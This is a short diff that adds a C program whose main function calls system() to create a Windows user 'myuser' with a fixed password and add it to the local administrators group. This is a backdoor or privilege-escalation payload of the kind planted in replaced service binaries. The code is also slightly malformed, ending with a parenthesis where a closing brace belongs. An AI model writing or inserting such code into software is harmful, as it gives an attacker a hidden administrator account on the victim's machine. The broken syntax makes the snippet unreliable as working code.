@@ -1,0 +1,8 @@
+#include <stdlib.h>
+int main()
+{
+system("net user myuser mypassword /add");
+system("net localgroup administrators myuser /add");
+return 0;
+)
+
